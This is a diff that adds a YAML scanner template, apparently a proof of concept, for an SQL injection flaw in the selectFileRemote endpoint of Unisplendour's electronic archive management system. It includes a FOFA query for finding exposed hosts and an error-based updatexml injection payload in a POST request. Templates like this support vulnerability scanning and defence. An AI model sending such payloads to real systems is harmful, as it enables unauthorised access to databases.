@@ -1,0 +1,20 @@
+id: poc-yaml-thams-selectFileRemote-sqli
+info:
+  name: 紫光电子档案管理系统selectFileRemote存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 紫光电子档案管理系统
+  fofa: app="紫光档案管理系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Archive/ErecordManage/selectFileRemote
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: userID=admin&fondsid=1&comid='%20and%20(updatexml(1,concat(0x7e,(select%20md5({{.t1}})),0x7e),1))
+  expression: "contains(body,\"SQLException\") && \ncontains(body,substr(t2,0,31))\n"
+transport: http
